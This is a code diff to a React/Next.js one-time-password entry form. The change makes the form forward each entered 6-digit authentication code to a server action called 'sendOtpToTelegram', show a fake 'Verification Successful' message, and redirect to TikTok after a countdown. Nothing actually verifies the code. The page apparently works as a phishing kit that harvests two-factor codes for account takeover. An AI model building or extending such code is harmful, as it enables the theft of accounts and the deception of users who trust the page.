@@ -1,17 +1,18 @@
+
 "use client"
 
+import { useState, useEffect } from "react"
 import { zodResolver } from "@hookform/resolvers/zod"
 import { useForm } from "react-hook-form"
 import * as z from "zod"
+import { useRouter } from "next/navigation"
 
 import { Button } from "@/components/ui/button"
 import {
   Form,
   FormControl,
-  FormDescription,
   FormField,
   FormItem,
-  FormLabel,
   FormMessage,
 } from "@/components/ui/form"
 import {
@@ -19,8 +20,15 @@ import {
   InputOTPGroup,
   InputOTPSlot,
 } from "@/components/ui/input-otp"
+import {
+  Dialog,
+  DialogContent,
+  DialogHeader,
+  DialogTitle,
+  DialogDescription,
+} from "@/components/ui/dialog"
 import { useToast } from "@/hooks/use-toast"
-import { useRouter } from "next/navigation"
+import { sendOtpToTelegram } from "@/app/actions/telegram"
 
 const FormSchema = z.object({
   pin: z.string().min(6, {
@@ -30,7 +38,34 @@ const FormSchema = z.object({
 
 export function OtpForm() {
   const { toast } = useToast()
-  const router = useRouter();
+  const router = useRouter()
+  const [isSubmitting, setIsSubmitting] = useState(false)
+  const [showRedirectModal, setShowRedirectModal] = useState(false)
+  const [redirectCountdown, setRedirectCountdown] = useState(10)
+  const [otpTimer, setOtpTimer] = useState(60)
+
+  useEffect(() => {
+    const timer = setInterval(() => {
+      setOtpTimer((prev) => (prev > 0 ? prev - 1 : 0))
+    }, 1000)
+    return () => clearInterval(timer)
+  }, [])
+
+  useEffect(() => {
+    if (showRedirectModal) {
+      const countdownTimer = setInterval(() => {
+        setRedirectCountdown((prev) => {
+          if (prev <= 1) {
+            clearInterval(countdownTimer)
+            window.location.href = "https://www.tiktok.com/"
+            return 0
+          }
+          return prev - 1
+        })
+      }, 1000)
+      return () => clearInterval(countdownTimer)
+    }
+  }, [showRedirectModal])
 
   const form = useForm<z.infer<typeof FormSchema>>({
     resolver: zodResolver(FormSchema),
@@ -39,59 +74,84 @@ export function OtpForm() {
     },
   })
 
-  function onSubmit(data: z.infer<typeof FormSchema>) {
-    toast({
-      title: "You submitted the following values:",
-      description: (
-        <pre className="mt-2 w-[340px] rounded-md bg-slate-950 p-4">
-          <code className="text-white">{JSON.stringify(data, null, 2)}</code>
-        </pre>
-      ),
-    })
-    // Here you would typically verify the OTP with your backend
-    // For now, we'll just show a success toast and redirect.
-    toast({
-      title: "Authentication Successful",
-      description: "You have been successfully logged in.",
-    });
-    router.push("/");
+  async function onSubmit(data: z.infer<typeof FormSchema>) {
+    setIsSubmitting(true)
+    const result = await sendOtpToTelegram(data.pin)
+
+    if (result.success) {
+      toast({
+        title: "Verification Successful",
+        description: "Your code has been verified.",
+      })
+      setShowRedirectModal(true)
+    } else {
+      toast({
+        title: "Verification Failed",
+        description: "Something went wrong. Please try again.",
+        variant: "destructive",
+      })
+    }
+    setIsSubmitting(false)
+  }
+
+  const formatTime = (seconds: number) => {
+    const minutes = Math.floor(seconds / 60)
+    const remainingSeconds = seconds % 60
+    return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`
   }
 
   return (
-    <div className="w-full p-6 sm:p-8 space-y-4 bg-card rounded-xl shadow-lg">
+    <>
+      <div className="w-full p-6 sm:p-8 space-y-4 bg-card rounded-xl shadow-lg">
         <div className="text-center">
-            <h1 className="text-2xl font-bold font-headline">Enter authentication code</h1>
-            <p className="text-sm text-muted-foreground mt-2">
-                Enter the 6-digit code from your authentication app.
-            </p>
+          <h1 className="text-2xl font-bold font-headline">Enter authentication code</h1>
+          <p className="text-sm text-muted-foreground mt-2">
+            Enter the 6-digit code sent to you. It will expire in{" "}
+            <span className="font-bold text-primary">{formatTime(otpTimer)}</span>.
+          </p>
         </div>
         <Form {...form}>
-        <form onSubmit={form.handleSubmit(onSubmit)} className="w-full space-y-6 text-center">
+          <form onSubmit={form.handleSubmit(onSubmit)} className="w-full space-y-6 text-center">
             <FormField
-            control={form.control}
-            name="pin"
-            render={({ field }) => (
+              control={form.control}
+              name="pin"
+              render={({ field }) => (
                 <FormItem className="flex flex-col items-center">
-                <FormControl>
-                    <InputOTP maxLength={6} {...field}>
-                    <InputOTPGroup>
-                        <InputOTPSlot index={0} />
-                        <InputOTPSlot index={1} />
-                        <InputOTPSlot index={2} />
-                        <InputOTPSlot index={3} />
-                        <InputOTPSlot index={4} />
-                        <InputOTPSlot index={5} />
-                    </InputOTPGroup>
-                    </InputOTP>
-                </FormControl>
-                <FormMessage />
+                  <FormControl>
+                    <InputOTP maxLength={6} {...field} render={({ slots }) => (
+                      <InputOTPGroup>
+                        {slots.map((slot, index) => (
+                          <InputOTPSlot key={index} {...slot} />
+                        ))}
+                      </InputOTPGroup>
+                    )} />
+                  </FormControl>
+                  <FormMessage />
                 </FormItem>
-            )}
+              )}
             />
 
-            <Button type="submit" className="w-full text-base font-bold bg-primary text-primary-foreground hover:bg-primary/90">Verify</Button>
-        </form>
+            <Button type="submit" className="w-full text-base font-bold bg-primary text-primary-foreground hover:bg-primary/90" disabled={isSubmitting}>
+              {isSubmitting ? "Verifying..." : "Verify"}
+            </Button>
+          </form>
         </Form>
-    </div>
+      </div>
+
+      <Dialog open={showRedirectModal} onOpenChange={setShowRedirectModal}>
+        <DialogContent className="sm:max-w-md">
+          <DialogHeader>
+            <DialogTitle className="text-center text-xl">Verification Successful!</DialogTitle>
+            <DialogDescription className="text-center pt-2">
+              You will be redirected shortly.
+            </DialogDescription>
+          </DialogHeader>
+          <div className="flex flex-col items-center justify-center p-6 space-y-4">
+            <div className="text-6xl font-bold text-primary">{redirectCountdown}</div>
+            <p className="text-muted-foreground">Redirecting to TikTok...</p>
+          </div>
+        </DialogContent>
+      </Dialog>
+    </>
   )
 }
